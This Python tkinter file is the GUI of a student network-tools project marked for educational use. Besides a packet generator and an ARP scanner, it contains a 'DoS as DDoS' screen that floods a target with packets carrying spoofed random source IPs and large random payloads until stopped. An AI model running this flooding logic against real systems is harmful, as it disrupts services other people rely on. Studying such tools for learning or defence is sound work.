# netTools/graphics.py
# This module contains the graphical user interface (GUI) for the NetTools application
# This project is under the GNU General Public License v3.0 (GPL-3.0).

from tkinter import *
from Packet import *
from FramePkt import *
from pathlib import Path
import socket
import sys
import threading
import random

POSITIONIMAGES = str(Path(__file__).parent.absolute()) + "\\images\\"

window = None
mainFrame = None
endDDoS = False

def createGraphics(windowPassed): # Initialize the graphics for the NetTools application
    global window, mainFrame, titleLabel, logoLabel

    window = windowPassed

    mainFrame = Frame(window, bg="black")

    titleLabel = Label(mainFrame, text="NetTools - Pro Network Analyzer", bg="black", fg="#16c60c", font=("Liberation Sans", 16, "bold"))
    titleLabel.pack(pady=30)

    logoImage = PhotoImage(file=POSITIONIMAGES+"netTools.png")
    logoLabel = Label(mainFrame, image=logoImage, bg="black")
    logoLabel.image = logoImage # Keep a reference to avoid garbage collection
    logoLabel.pack(padx=10)

    mainFrame.pack(fill=BOTH, expand=True)

def destroyAllGraphics():
    global mainFrame

    if mainFrame is not None:
        mainFrame.destroy()
        mainFrame = None

def menuGestor(functionName): # Manage the menu selection and update the graphics accordingly
    if functionName == "Packet Generator":
        destroyAllGraphics()

        createPacketGeneratorGraphics()
    elif functionName == "ARP Analyzer":
        destroyAllGraphics()

        createARPAnalyzerGraphics()
    elif functionName == "DoS as DDoS":
        destroyAllGraphics()

        createDoSGraphics()
    elif functionName == "About":
        destroyAllGraphics()
        global mainFrame

        mainFrame = Frame(window, bg="black")
        mainFrame.pack(fill=BOTH, expand=True)

        aboutLabel = Label(mainFrame, text='''
NetTools - Pro Network Analyzer
Summer of Making 2025 Edition
                           
Author: Gianluca Rainis ( __grdev on summer.hackclub.com )
                           
This project is under the GNU General Public License v3.0 (GPL-3.0).
                           
GitHub: https://github.com/rainis-gianluca/SummerOfMaking2025.git
                         
EDUCATIONAL PURPOSES ONLY
                           
Good Hack!''', bg="black", fg="#16c60c", font=("Liberation Sans", 12))
        
        aboutLabel.pack(pady=20)
    else:
        pass

def createPacketGeneratorGraphics(): # Create the Packet Generator graphics
    global mainFrame

    COLUMN1PADX = 17
    COLUMN2PADX = 80
    ROWPADY = 5

    try:
        packet = Packet() # Initialize the Packet class
    except Exception as e:
        writeLog("Error initializing Packet class:", e)

    mainFrame = Frame(window, bg="black")
    mainFrame.pack(fill=BOTH, expand=True)

    tempRowKey = 1

    sourceIpLabel = Label(mainFrame, text="Source IP:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    sourceIpLabel.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey-1, sticky=N)
    sourceIpEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    sourceIpEntry.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey, sticky=W)

    destinationIpLabel = Label(mainFrame, text="Destination IP:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    destinationIpLabel.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey-1, sticky=N)
    destinationIpEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    destinationIpEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey, sticky=W)

    tempRowKey += 2

    sourcePortLabel = Label(mainFrame, text="Source Port:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    sourcePortLabel.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey-1, sticky=N)
    sourcePortEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    sourcePortEntry.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey, sticky=W)

    destinationPortLabel = Label(mainFrame, text="Destination Port:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    destinationPortLabel.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey-1, sticky=N)
    destinationPortEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    destinationPortEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey, sticky=W)

    tempRowKey += 2

    ttlLabel = Label(mainFrame, text="TTL:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    ttlLabel.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey-1, sticky=N)
    ttlEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    ttlEntry.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey, sticky=W)

    numberOfPacketsLabel = Label(mainFrame, text="Number of packets:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    numberOfPacketsLabel.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey-1, sticky=N)
    numberOfPacketsEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    numberOfPacketsEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey, sticky=W)
    
    tempRowKey += 2

    messageLabel = Label(mainFrame, text="Message:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    messageLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=tempRowKey-1, sticky=N, columnspan=2)
    messageEntry = Text(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12), height=4, width=50)
    messageEntry.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=tempRowKey, sticky=W+E, columnspan=2)

    tempRowKey += 2

    logText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
    logText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=tempRowKey-1, sticky=W+E, columnspan=2)

    logScrollbar = Scrollbar(mainFrame, command=logText.yview)
    logScrollbar.grid(row=tempRowKey-1, column=2, sticky='ns', pady=ROWPADY)

    try:
        startButton = Button(mainFrame, text="Start", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: startSendingProcess())
        startButton.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=tempRowKey, sticky=W)

        endButton = Button(mainFrame, text="End", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: packet.set_number_packets(0))
        endButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=tempRowKey, sticky=W)
    except Exception as e:
        writeLog("Error: " + str(e))

    # Internal use only functions
    def writeLog(message):
        logText.config(state=NORMAL)
        logText.insert(END, message + "\n")
        logText.config(state=DISABLED)

    def startSendingProcess():
        try:
            if not (packet.get_source_ip() != str(sourceIpEntry.get()) or packet.get_destination_ip() != str(destinationIpEntry.get()) or packet.get_source_port() != str(sourcePortEntry.get()) or packet.get_destination_port() != str(destinationPortEntry.get()) or packet.get_ttl() != int(ttlEntry.get()) or packet.get_message() != str(messageEntry.get(0.0, END)).strip()):
                try:
                    packet.prepare_packet()
                    packet.send_packets()
                except Exception as e:
                    writeLog("\nError: " + str(e))
            else:
                try:
                    packet.set_source_ip(str(sourceIpEntry.get()))
                except Exception as e:
                    writeLog("Invalid IP address: " + str(e))
                
                try:
                    packet.set_destination_ip(str(destinationIpEntry.get()))
                except Exception as e:
                    writeLog("Invalid IP address or DNS: " + str(e))
                
                try:
                    packet.set_source_port(str(sourcePortEntry.get()))
                except Exception as e:
                    writeLog("Invalid source port: " + str(e))
                
                try:
                    packet.set_destination_port(str(destinationPortEntry.get()))
                except Exception as e:
                    writeLog("Invalid destination port: " + str(e))
                
                try:
                    packet.set_ttl(int(ttlEntry.get()))
                except Exception as e:
                    writeLog("Invalid ttl: " + str(e))
                
                try:
                    packet.set_message(str(messageEntry.get(0.0, END)).strip())
                except Exception as e:
                    writeLog("Invalid message: " + str(e))
                
                try:
                    packet.set_payload_length(len(packet.get_message().encode()))
                except Exception as e:
                    writeLog("Invalid payload length: " + str(e))
                
                try:
                    if str(numberOfPacketsEntry.get()) == "-1" or (str(numberOfPacketsEntry.get()).isnumeric() and int(str(numberOfPacketsEntry.get())) > 0):
                        packet.set_number_packets(int(str(numberOfPacketsEntry.get())))
                    else:
                        writeLog("Invalid number of packets.")
                        return
                except Exception as e:
                    writeLog("Invalid number of packets: " + str(e))

                try:
                    packet.connect(log_callback=writeLog)
                    packet.prepare_packet(log_callback=writeLog)
                    packet.send_packets(log_callback=writeLog)
                except Exception as e:
                    writeLog("\nError: " + str(e))
        except:
            return

        writeLog("\nProcess completed.")

def createARPAnalyzerGraphics(): # Create the ARP Analyzer graphics
    global mainFrame

    COLUMN1PADX = 17
    COLUMN2PADX = 80
    ROWPADY = 5

    mainFrame = Frame(window, bg="black")
    mainFrame.pack(fill=BOTH, expand=True)

    destinationIpLabel = Label(mainFrame, text="Network IP:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    destinationIpLabel.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=0, sticky=N)
    destinationIpEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    destinationIpEntry.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=1, sticky=W)

    subMaskLabel = Label(mainFrame, text="Subnet Mask:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    subMaskLabel.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=0, sticky=N)
    subMaskEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    subMaskEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=1, sticky=W)

    messageLabel = Label(mainFrame, text="Log:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    messageLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=2, sticky=N, columnspan=2)
    logText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
    logText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=3, sticky=W+E, columnspan=2)

    logScrollbar = Scrollbar(mainFrame, command=logText.yview)
    logScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)

    arpmessageLabel = Label(mainFrame, text="Arp data:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    arpmessageLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=4, sticky=N, columnspan=2)
    arpText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
    arpText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=5, sticky=W+E, columnspan=2)

    arpScrollbar = Scrollbar(mainFrame, command=arpText.yview)
    arpScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)

    try:
        frame = FramePkt() # Initialize the Packet class
    except Exception as e:
        writeLog("Error initializing Packet class:", e)

    try:
        startButton = Button(mainFrame, text="Start", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: startSendingProcess())
        startButton.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=6, sticky=N)
        endButton = Button(mainFrame, text="END", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: frame.set_stopProcess(True))
        endButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=6, sticky=W)
    except Exception as e:
        writeLog("Error: " + str(e))

    # Internal use only functions
    def writeLog(message):
        logText.config(state=NORMAL)
        logText.insert(END, message + "\n")
        logText.config(state=DISABLED)

    def writeArp(message):
        arpText.config(state=NORMAL)
        arpText.insert(END, message + "\n")
        arpText.config(state=DISABLED)

    def startSendingProcess():
        try:
            try:
                frame.set_networkIp(str(destinationIpEntry.get()))
            except Exception as e:
                writeLog("Invalid IP address: " + str(e))

            try:
                frame.set_subnetMask(str(subMaskEntry.get()))
            except Exception as e:
                writeLog("Invalid IP address: " + str(e))

            try:
                frame.prepare_frame()

                thread1 = threading.Thread(target=frame.send_frame, args=(writeLog, writeArp))
                thread1.start()
            except Exception as e:
                writeLog("\nError: " + str(e))
        except:
            return
        
def createDoSGraphics():
    global mainFrame

    COLUMN1PADX = 17
    COLUMN2PADX = 80
    ROWPADY = 5

    mainFrame = Frame(window, bg="black")
    mainFrame.pack(fill=BOTH, expand=True)

    destinationIpLabel = Label(mainFrame, text="Destination IP:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    destinationIpLabel.grid(pady=ROWPADY+10, padx=COLUMN1PADX, column=0, row=0, sticky=N)
    destinationIpEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
    destinationIpEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=0, sticky=W)

    messageLabel = Label(mainFrame, text="Log:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    messageLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=1, sticky=N, columnspan=2)
    logText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
    logText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=2, sticky=W+E, columnspan=2)

    logScrollbar = Scrollbar(mainFrame, command=logText.yview)
    logScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)

    currentPktDataLabel = Label(mainFrame, text="Current Data:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
    currentPktDataLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=3, sticky=N, columnspan=2)
    currentPktDataText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
    currentPktDataText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=4, sticky=W+E, columnspan=2)

    currentPktDataScrollbar = Scrollbar(mainFrame, command=currentPktDataText.yview)
    currentPktDataScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)

    try:
        packet = Packet() # Initialize the Packet class
    except Exception as e:
        writeLog("Error initializing Packet class:", e)

    try:
        startButton = Button(mainFrame, text="Start", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: threading.Thread(target=startSendingProcess, args=()).start())
        startButton.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=6, sticky=N)
        endButton = Button(mainFrame, text="END", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: stopDDoSProcess(True))
        endButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=6, sticky=W)
    except Exception as e:
        writeLog("Error: " + str(e))

    # Internal use only functions
    def writeLog(message):
        logText.config(state=NORMAL)
        logText.insert(END, message + "\n")
        logText.see(END)
        logText.config(state=DISABLED)

    def writeCurrentData(message):
        currentPktDataText.config(state=NORMAL)
        currentPktDataText.insert(END, message + "\n")
        currentPktDataText.see(END)
        currentPktDataText.config(state=DISABLED)

    def getRandomIp():
        return str(str(random.randint(1, 255))+"."+str(random.randint(1, 255))+"."+str(random.randint(1, 255))+"."+str(random.randint(1, 255)))
    
    def getRandomStr():
        # 2 char = 1 byte max 65515 byte
        lenght = random.randint(1, 65515*2)
        randStr = ""

        for i in range(lenght):
            randStr += chr(random.randint(33, 126))  # Printable ASCII characters
        
        return str(randStr)
    
    def setNewPacketData():
        try:
            try:
                packet.set_source_ip(getRandomIp())
            except Exception as e:
                writeLog("Invalid IP address: " + str(e))
            
            try:
                packet.set_destination_ip(str(destinationIpEntry.get()))
            except Exception as e:
                writeLog("Invalid IP address or DNS: " + str(e))
            
            try:
                packet.set_source_port(str(random.randint(1024, 65535)))
            except Exception as e:
                writeLog("Invalid source port: " + str(e))
            
            try:
                packet.set_destination_port(str(random.randint(1024, 65535)))
            except Exception as e:
                writeLog("Invalid destination port: " + str(e))
            
            try:
                packet.set_ttl(int(255)) # Default TTL for DoS attacks
            except Exception as e:
                writeLog("Invalid ttl: " + str(e))
            
            try:
                packet.set_message(str(getRandomStr()).strip())
            except Exception as e:
                writeLog("Invalid message: " + str(e))
            
            try:
                packet.set_payload_length(len(packet.get_message().encode()))
            except Exception as e:
                writeLog("Invalid payload length: " + str(e))
            
            try:
                packet.set_number_packets(int(10)) # Default number of packets for DoS attacks
            except Exception as e:
                writeLog("Invalid number of packets: " + str(e))

            writeCurrentData(f'''
New packet data set:
Source IP: {packet.get_source_ip()}
Destination IP: {packet.get_destination_ip()}
Source Port: {packet.get_source_port()}
Destination Port: {packet.get_destination_port()}
Message: OMITTED (for length reasons)
Payload Length: {packet.get_payload_length()}
''')
        except Exception as e:
            writeLog("\nError: " + str(e))
            return
        
        writeLog("\nNew packet data set successfully.")
        return
    
    def stopDDoSProcess(stop):
        global endDDoS

        if stop:
            endDDoS = True

    def startSendingProcess():
        global endDDoS
        
        while not endDDoS:
            try:
                try:
                    setNewPacketData()
                except Exception as e:
                    writeLog("\nError: " + str(e))
                
                try:
                    packet.connect(writeLog)
                except Exception as e:
                    writeLog("\nError: " + str(e))
                
                try:
                    packet.prepare_packet(writeLog)
                except Exception as e:
                    writeLog("\nError: " + str(e))
                
                try:
                    packet.send_packets(writeLog, timeoutForRespoonse=0)
                except Exception as e:
                    writeLog("\nError: " + str(e))
            except Exception as e:
                writeLog("\nError: " + str(e))
                return
            
        writeLog("\nProcess completed.")